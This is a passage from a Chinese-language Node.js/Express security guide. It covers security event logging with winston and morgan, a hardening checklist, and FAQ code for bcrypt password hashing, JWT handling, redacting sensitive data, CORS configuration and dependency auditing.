    // 安全日志
    new winston.transports.File({
      filename: 'logs/security.log',
      level: 'warn'
    }),
    // 综合日志
    new winston.transports.File({
      filename: 'logs/combined.log'
    })
  ]
})

// 开发环境控制台输出
if (process.env.NODE_ENV !== 'production') {
  logger.add(new winston.transports.Console({
    format: winston.format.simple()
  }))
}

// ==================== 安全事件日志 ====================

const securityLog = {
  login: (userId, ip, success) => {
    logger.warn('LOGIN_ATTEMPT', {
      userId,
      ip,
      success,
      timestamp: new Date().toISOString()
    })
  },
  
  failedAuth: (ip, reason) => {
    logger.warn('AUTH_FAILURE', {
      ip,
      reason,
      timestamp: new Date().toISOString()
    })
  },
  
  rateLimitExceeded: (ip, endpoint) => {
    logger.warn('RATE_LIMIT', {
      ip,
      endpoint,
      timestamp: new Date().toISOString()
    })
  },
  
  suspiciousRequest: (req, reason) => {
    logger.warn('SUSPICIOUS_REQUEST', {
      ip: req.ip,
      method: req.method,
      url: req.originalUrl,
      headers: req.headers,
      reason,
      timestamp: new Date().toISOString()
    })
  },
  
  dataAccess: (userId, resource, action) => {
    logger.info('DATA_ACCESS', {
      userId,
      resource,
      action,
      timestamp: new Date().toISOString()
    })
  }
}

// ==================== HTTP 请求日志 ====================

morgan.token('user-id', (req) => req.user?.id || 'anonymous')
morgan.token('client-ip', (req) => req.ip)

app.use(morgan(':client-ip - :user-id [:date] ":method :url HTTP/:http-version" :status :res[content-length] ":referrer" ":user-agent"', {
  stream: {
    write: (message) => logger.http(message.trim())
  },
  skip: (req) => {
    // 跳过健康检查等
    return req.path === '/health'
  }
}))
```

### 安全检查清单

#### 代码层面

- [ ] 所有用户输入都经过验证和转义
- [ ] 使用参数化查询或 ORM 操作数据库
- [ ] 配置安全响应头（使用 Helmet）
- [ ] 实施 CSRF 防护
- [ ] 密码使用 bcrypt/scrypt/argon2 等慢哈希存储
- [ ] 敏感信息不记录在日志中
- [ ] 实施速率限制防止暴力破解
- [ ] 使用环境变量管理敏感配置
- [ ] 禁用不必要的 HTTP 方法
- [ ] 文件上传进行类型和大小限制

#### 配置层面

- [ ] 使用 HTTPS 加密传输
- [ ] 配置 HSTS 头
- [ ] Cookie 设置 HttpOnly、Secure、SameSite
- [ ] 定期更新依赖包并修复漏洞
- [ ] 配置安全的 CORS 策略
- [ ] 使用非 root 用户运行服务
- [ ] 配置日志审计
- [ ] 设置合理的请求体大小限制

#### 部署层面

- [ ] 数据库连接使用加密
- [ ] 敏感配置使用密钥管理服务
- [ ] 配置 WAF 防火墙
- [ ] 启用 DDoS 防护
- [ ] 定期备份数据
- [ ] 配置监控告警

### 常见问题解答

#### Q1: 如何在生产环境安全地存储密码？

```javascript
const bcrypt = require('bcrypt')

// 密码加密
async function hashPassword(password) {
  const saltRounds = 12 // 推荐值：10-12
  return bcrypt.hash(password, saltRounds)
}

// 密码验证
async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash)
}

// 使用示例
app.post('/register', async (req, res) => {
  const hashedPassword = await hashPassword(req.body.password)
  await User.create({
    email: req.body.email,
    password: hashedPassword
  })
  res.json({ success: true })
})

app.post('/login', async (req, res) => {
  const user = await User.findOne({ where: { email: req.body.email } })
  
  if (!user || !await verifyPassword(req.body.password, user.password)) {
    // 记录失败尝试
    securityLog.failedAuth(req.ip, 'Invalid credentials')
    return res.status(401).json({ error: '邮箱或密码错误' })
  }
  
  // 生成 JWT 或 Session
  const token = generateToken(user)
  securityLog.login(user.id, req.ip, true)
  res.json({ token })
})
```

#### Q2: 如何安全地处理 JWT Token？

```javascript
const jwt = require('jsonwebtoken')

// Token 生成
function generateTokens(user) {
  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' } // 短期 Token
  )
  
  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' } // 长期刷新 Token
  )
  
  return { accessToken, refreshToken }
}

// Token 验证中间件
function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization
  
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: '未提供认证 Token' })
  }
  
  const token = authHeader.split(' ')[1]
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET)
    req.user = decoded
    next()
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token 已过期', code: 'TOKEN_EXPIRED' })
    }
    return res.status(401).json({ error: '无效的 Token' })
  }
}

// 安全的 Token 存储（前端）
// 建议：
// - AccessToken 存储在内存中
// - RefreshToken 存储在 HttpOnly Cookie 中
```

#### Q3: 如何防止敏感数据泄露？

```javascript
// 1. 数据库模型：排除敏感字段
const User = sequelize.define('User', {
  id: { type: Sequelize.INTEGER, primaryKey: true },
  username: { type: Sequelize.STRING },
  email: { type: Sequelize.STRING },
  password: { type: Sequelize.STRING },
  role: { type: Sequelize.STRING },
  createdAt: { type: Sequelize.DATE }
}, {
  defaultScope: {
    attributes: { exclude: ['password'] } // 默认排除密码
  },
  scopes: {
    withPassword: {
      attributes: {} // 需要密码时显式调用
    }
  }
})

// 2. 响应数据过滤
function sanitizeUser(user) {
  const { password, ...safeUser } = user.toJSON ? user.toJSON() : user
  return safeUser
}

app.get('/users/:id', async (req, res) => {
  const user = await User.findByPk(req.params.id)
  res.json(sanitizeUser(user))
})

// 3. 日志脱敏
function sanitizeLog(data) {
  const sensitiveFields = ['password', 'token', 'creditCard', 'ssn']
  const sanitized = { ...data }
  
  for (const field of sensitiveFields) {
    if (sanitized[field]) {
      sanitized[field] = '***REDACTED***'
    }
  }
  
  return sanitized
}

// 4. 环境变量管理
// config.js
module.exports = {
  jwt: {
    secret: process.env.JWT_SECRET,
    expiresIn: process.env.JWT_EXPIRES_IN || '15m'
  },
  database: {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD // 不要硬编码
  }
}

```

```bash
# .env（不要提交到版本控制）
JWT_SECRET=your-super-secret-key
DB_HOST=localhost
DB_USER=app_user
DB_PASSWORD=secure_password
```

#### Q4: 如何实现安全的 CORS 配置？

```javascript
const cors = require('cors')

// 动态 CORS 配置
const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://example.com',
      'https://www.example.com',
      'https://admin.example.com'
    ]
    
    // 允许无 origin 的请求（如移动应用、Postman）
    if (!origin) return callback(null, true)
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true)
    } else {
      callback(new Error('不允许的来源'))
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  exposedHeaders: ['X-Total-Count'],
  credentials: true, // 允许携带 Cookie
  maxAge: 86400 // 预检请求缓存时间
}

app.use(cors(corsOptions))

// 针对 API 路由的特殊 CORS
app.use('/api/public', cors({
  origin: '*',
  methods: ['GET']
}))
```

#### Q5: 如何检测和防止依赖包漏洞？

```bash
# 1. 使用 npm audit
npm audit
npm audit fix

# 2. 使用 snyk（更全面的扫描）
npm install -g snyk
snyk auth
snyk test
snyk monitor

# 3. CI/CD 集成
# .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm audit --audit-level=high
      - run: npx snyk test

# 4. package.json 配置
{
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix"
  },
  "engines": {
    "node": ">=18.0.0"
  }
}
```

### 参考资源

#### 官方文档

- [OWASP Top 10](https://owasp.org/Top10/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [Helmet.js](https://helmetjs.github.io/)
- [npm audit](https://docs.npmjs.com/cli/audit)

#### 安全工具

- **静态分析**：[ESLint Security Plugin](https://github.com/eslint-community/eslint-plugin-security)
- **依赖扫描**：[Snyk](https://snyk.io/)、[npm audit](https://docs.npmjs.com/cli/audit)
- **渗透测试**：[OWASP ZAP](https://www.zaproxy.org/)、[Burp Suite](https://portswigger.net/burp)
- **漏洞数据库**：[CVE](https://cve.mitre.org/)、[NVD](https://nvd.nist.gov/)

#### 学习资源

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Security Headers](https://securityheaders.com/)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
